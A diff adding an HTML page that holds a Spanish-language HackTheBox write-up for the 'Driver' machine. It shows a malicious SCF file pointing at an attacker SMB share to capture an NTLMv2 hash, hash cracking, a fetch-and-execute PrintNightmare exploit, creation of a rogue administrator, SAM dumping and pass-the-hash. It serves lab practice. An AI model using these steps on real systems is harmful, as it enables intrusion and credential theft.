@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Driver</title>
+
+  <meta name="description" content="Resolución de la máquina Driver de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Driver">
+  <meta name="twitter:description" content="Resolución de la máquina Driver de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/driver.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Driver">
+  <meta property="og:description" content="Resolución de la máquina Driver de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/driver.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/driver.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Driver" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-tony">Shell - tony</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/driver.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Driver</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos 4 puertos que son solo 3 servicios corriendo, <code class="language-plaintext highlighter-rouge">http</code>, <code class="language-plaintext highlighter-rouge">smb</code> y <code class="language-plaintext highlighter-rouge">winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.11.106
+Nmap scan report for 10.10.11.106  
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+445/tcp  open  microsoft-ds
+5985/tcp open  wsman</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si intentamos listar recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code> vemos que no tenemos permisos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ smbclient</span><span class="p"> -N -L 10.10.11.106
+session setup failed: NT_STATUS_ACCESS_DENIED  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Dandole un vistazo a la pagina <code class="language-plaintext highlighter-rouge">web</code> podemos ver que nos pide <code class="language-plaintext highlighter-rouge">autenticación</code></p>
+<a href="/htb/driver/1.png" target="_blank"><div><p><img src="/htb/driver/1.png"></p></div></a>
+
+<p class="plain-text">Sin embargo al probar credenciales por defecto este caso <code class="language-plaintext highlighter-rouge">admin:admin</code> entramos</p>
+<a href="/htb/driver/5.png" target="_blank"><div><p><img src="/htb/driver/5.png"></p></div></a>
+
+<p class="plain-text">Ahora podemos ver una página que nos habla de probar <code class="language-plaintext highlighter-rouge">firmware</code> de impresoras y tal</p>
+<a href="/htb/driver/2.png" target="_blank"><div><p><img src="/htb/driver/2.png"></p></div></a>
+
+<section class="post" id="shell-tony">
+<br><h3 class="post-title">Shell - tony</h3><br>
+
+<p class="plain-text">En el apartado de <code class="language-plaintext highlighter-rouge">Firmware Updates</code> podemos ver un campo de carga de archivos, donde se nos pide subir el archivo de <code class="language-plaintext highlighter-rouge">firmware</code> para que alguien lo vea y lo testee</p>
+<a href="/htb/driver/3.png" target="_blank"><div><p><img src="/htb/driver/3.png"></p></div></a>
+
+<p class="plain-text">Nos dice que alguien va a <code class="language-plaintext highlighter-rouge">revisarlo</code> de forma manual, podemos crear un archivo <a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">scf</a> para cuando alguien lo revise este cargue como <code class="language-plaintext highlighter-rouge">icono</code> un archivo almacenado en un <code class="language-plaintext highlighter-rouge">servidor smb</code> que montaremos, asi al conectarse al servicio se <code class="language-plaintext highlighter-rouge">autenticará</code> y por lo que podemos capturar el <code class="language-plaintext highlighter-rouge">hash ntlmv2</code> del usuario que lo cargue</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">[</span><span class="na">Shell</span><span class="p">]
+</span><span class="o">IconFile</span><span class="p">=</span><span class="s">\\10.10.14.10\kali\pwned.ico  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Creamos el servidor <code class="language-plaintext highlighter-rouge">smb</code> en el directorio actual dando soporte a smb de versión <code class="language-plaintext highlighter-rouge">2</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo impacket-smbserver </span><span class="p">kali . -smb2support
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0  
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Guardamos el archivo malicioso con el nombre <code class="language-plaintext highlighter-rouge">file.scf</code> y lo subimos en la web</p>
+<a href="/htb/driver/4.png" target="_blank"><div><p><img src="/htb/driver/4.png"></p></div></a>
+
+<p class="plain-text">Al subirlo en la web recibimos en nuestro servidor el hash <code class="language-plaintext highlighter-rouge">ntlmv2</code> del usuario <code class="language-plaintext highlighter-rouge">tony</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo impacket-smbserver </span><span class="p">kali . -smb2support
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.11.106,49414)
+[*] AUTHENTICATE_MESSAGE (DRIVER\tony,DRIVER)
+[*] User DRIVER\tony authenticated successfully
+[*] tony::DRIVER:aaaaaaaaaaaaaaaa:70eb5f848efe998ddcc3ce79b767dde5:010100000000000000326b87086bd90179eabf665cf8bf4900000000010010004d006f004e0075005000420063006d00030010004d006f004e0075005000420063006d0002001000730061004f006600540077005a00650004001000730061004f006600540077005a0065000700080000326b87086bd901060004000200000008003000300000000000000000000000002000008b69b25ebd7bc465fb5892f9136b5a95cbd83588e1d88e98a38188143fb96f4c0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0033003300000000000000000000000000  
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:kali)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Guardamos el hash ntlmv2 de tony en un archivo llamado <code class="language-plaintext highlighter-rouge">hash</code> y con <code class="language-plaintext highlighter-rouge">john</code> aplicamos fuerza bruta para obtener la contraseña en texto plano</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash  
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">liltony          </span><span class="p">(</span><span class="am">tony</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> comprobamos que las credenciales son válidas para <code class="language-plaintext highlighter-rouge">smb</code> sin embargo al listar los recursos no tenemos privilegio de lectura en ninguno de ellos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.11.106 -u tony -p liltony --shares
+</span><span class="az">SMB         </span><span class="p">10.10.11.106      445    DRIVER           </span><span class="az">[*] </span><span class="p">Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">10.10.11.106      445    DRIVER           </span><span class="ve">[+] </span><span class="p">DRIVER\tony:liltony 
+</span><span class="az">SMB         </span><span class="p">10.10.11.106      445    DRIVER           </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">10.10.11.106      445    DRIVER           </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">10.10.11.106      445    DRIVER           </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">10.10.11.106      445    DRIVER           </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">10.10.11.106      445    DRIVER           </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">10.10.11.106      445    DRIVER           </span><span class="am">IPC$                            Remote IPC</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo al cambiar a <code class="language-plaintext highlighter-rouge">winrm</code> también son válidas y por lo que devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">winrm 10.10.11.106 -u tony -p liltony         
+</span><span class="az">SMB         </span><span class="p">10.10.11.106      5985   DRIVER           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 10240 (name:DRIVER) (domain:DRIVER)  
+</span><span class="az">HTTP        </span><span class="p">10.10.11.106      5985   DRIVER           </span><span class="az">[*] </span><span class="p">http://10.10.11.106:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">10.10.11.106      5985   DRIVER           </span><span class="ve">[+] </span><span class="p">DRIVER\tony:liltony </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos podemos conectar con <code class="language-plaintext highlighter-rouge">evil-winrm</code> y obtener una <code class="language-plaintext highlighter-rouge">shell</code> además de la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i 10.10.11.106 -u tony -p liltony
+PS C:\Users\tony\Documents> </span><span class="am">whoami</span><span class="p">
+driver\tony
+PS C:\Users\tony\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\user.txt  
+e51**************************d87
+PS C:\Users\tony\Documents></span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Si leemos el <code class="language-plaintext highlighter-rouge">historial</code> de <code class="language-plaintext highlighter-rouge">powershell</code> de nuestro usuario encontramos 3 comandos, 2 de ellos son <code class="language-plaintext highlighter-rouge">ping</code> y el otro es un comando para añadir una <code class="language-plaintext highlighter-rouge">impresora</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\tony\Documents> </span><span class="am">type</span><span class="p"> ..\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt  
+Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'
+
+ping 1.1.1.1
+ping 1.1.1.1
+PS C:\Users\tony\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">rpcdump</code> podemos comprobar que esta corriendo el servicio <code class="language-plaintext highlighter-rouge">spoolsv.exe</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-rpcdump </span><span class="p">10.10.11.106 | </span><span class="ve">grep</span><span class="p"> -E </span><span class="am">'MS-RPRN|MS-PAR'</span><span class="p"> -A1  
+Protocol: [</span><span class="ro">MS-PAR</span><span class="p">]: Print System Asynchronous Remote Protocol
+Provider: spoolsv.exe
+</span><span class="az">--</span><span class="p">
+Protocol: [</span><span class="ro">MS-RPRN</span><span class="p">]: Print System Remote Protocol
+Provider: spoolsv.exe</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Buscando vulnerabilidades para ello encontramos un exploit para el <a href="https://github.com/calebstewart/CVE-2021-1675">CVE-2021-1675</a>, aprovechamos la función <code class="language-plaintext highlighter-rouge">upload</code> de <code class="language-plaintext highlighter-rouge">evil-winrm</code> para subir el archivo <code class="language-plaintext highlighter-rouge">ps1</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\tony\Documents> </span><span class="am">upload </span><span class="p">CVE-2021-1675.ps1
+</span><span class="az">
+Info: Uploading CVE-2021-1675.ps1 to C:\Users\tony\Documents\CVE-2021-1675.ps1  
+</span><span class="sa">
+Data: 238080 bytes of 238080 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\tony\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo al intentar <code class="language-plaintext highlighter-rouge">importar</code> el script nos devuelve un <code class="language-plaintext highlighter-rouge">error</code> diciendo que por politicas la ejecución de scripts esta <code class="language-plaintext highlighter-rouge">deshabilitada</code> en el sistema</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\tony\Documents> </span><span class="am">Import-Module</span><span class="p"> .\CVE-2021-1675.ps1
+</span><span class="ro">File C:\Users\tony\Documents\CVE-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.  
+At line:1 char:1
++ Import-Module .\CVE-2021-1675.ps1
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
+</span><span class="p">PS C:\Users\tony\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para pasar este filtro podemos iniciar compartiendo el archivo por un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ls</span><span class="p">
+ CVE-2021-1675.ps1
+
+</span><span class="ve">❯ sudo python3</span><span class="p"> -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">curl</code> leemos el contenido del ps1 y lo ejecutamos con <code class="language-plaintext highlighter-rouge">Invoke-Expression</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\tony\Documents> </span><span class="am">curl </span><span class="p">10.10.14.33/CVE-2021-1675.ps1 </span><span class="c1">-UseBasicParsing </span><span class="p">| </span><span class="am">Invoke-Expression  </span><span class="p">
+PS C:\Users\tony\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usamos su función <code class="language-plaintext highlighter-rouge">Invoke-Nightmare</code> para crear un usuario <code class="language-plaintext highlighter-rouge">Administrador</code>, nosotros podemos definir el usuario y contraseña, en este caso usare <code class="language-plaintext highlighter-rouge">pwned:pwned</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\tony\Documents> </span><span class="am">Invoke-Nightmare </span><span class="c1">-NewUser </span><span class="p">pwned</span><span class="c1"> -NewPassword </span><span class="p">pwned
+[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
+[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"  
+[+] added user pwned as local administrator
+[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
+PS C:\Users\tony\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez ejecutado el exploit podemos comprobar que se creo el usuario <code class="language-plaintext highlighter-rouge">pwned</code> correctamente además que forma parte del grupo local <code class="language-plaintext highlighter-rouge">Administrators</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\tony\Documents> </span><span class="am">net </span><span class="p">user pwned
+User name                    pwned
+Full Name                    pwned
+Comment
+User's comment
+Country/region code          000 (System Default)  
+Account active               Yes
+Account expires              Never
+
+Password last set            4/9/2023 5:48:42 PM
+Password expires             Never
+Password changeable          4/9/2023 5:48:42 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators
+Global Group memberships     *None
+
+The command completed successfully.
+
+PS C:\Users\tony\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Deberiamos poder conectarnos como el usuario <code class="language-plaintext highlighter-rouge">pwned</code> con <code class="language-plaintext highlighter-rouge">evil-winrm</code>, y ya que somos administratores podemos leer la <code class="language-plaintext highlighter-rouge">flag</code> de altos privilegios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i 10.10.11.106 -u pwned -p pwned
+PS C:\Users\pwned\Documents> </span><span class="am">whoami</span><span class="p">
+driver\pwned
+PS C:\Users\pwned\Documents> </span><span class="am">type</span><span class="p"> ..\..\Administrator\Desktop\root.txt  
+41a2**************************89
+PS C:\Users\pwned\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si quisieramos obtener una shell como <code class="language-plaintext highlighter-rouge">Administrator</code> con secretsdump o en este caso <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos dumpear la <code class="language-plaintext highlighter-rouge">sam</code> y ver los hashes de todos los usuarios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.11.106 -u pwned -p pwned --sam
+</span><span class="az">SMB         </span><span class="p">10.10.11.106      445    DRIVER           </span><span class="az">[*] </span><span class="p">Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">10.10.11.106      445    DRIVER           </span><span class="ve">[+] </span><span class="p">DRIVER\pwned:pwned </span><span class="am">(Pwn3d!)</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">10.10.11.106      445    DRIVER           </span><span class="ve">[+] </span><span class="p">Dumping SAM hashes
+</span><span class="az">SMB         </span><span class="p">10.10.11.106      445    DRIVER           </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1256cff8b5b5fdb8c327d3b6c3f5017:::
+</span><span class="az">SMB         </span><span class="p">10.10.11.106      445    DRIVER           </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">10.10.11.106      445    DRIVER           </span><span class="am">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">10.10.11.106      445    DRIVER           </span><span class="am">tony:1003:aad3b435b51404eeaad3b435b51404ee:dfdb5b520de42ca5d1b84ce61553d085:::
+</span><span class="az">SMB         </span><span class="p">10.10.11.106      445    DRIVER           </span><span class="am">pwned:1004:aad3b435b51404eeaad3b435b51404ee:7ba5d618fbd033271413101bf82b69bd:::
+</span><span class="az">SMB         </span><span class="p">10.10.11.106      445    DRIVER           </span><span class="ve">[+] </span><span class="p">Added </span><span class="am">5 </span><span class="p">SAM hashes to the database</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos hacer un <code class="language-plaintext highlighter-rouge">passthehash</code> para conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> proporcionando solo <code class="language-plaintext highlighter-rouge">hash nt</code> del usuario <code class="language-plaintext highlighter-rouge">Administrator</code>, obtenemos una shell como Administrator</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i 10.10.11.106 -u Administrator -H d1256cff8b5b5fdb8c327d3b6c3f5017  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+driver\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\root.txt
+41a**************************289
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
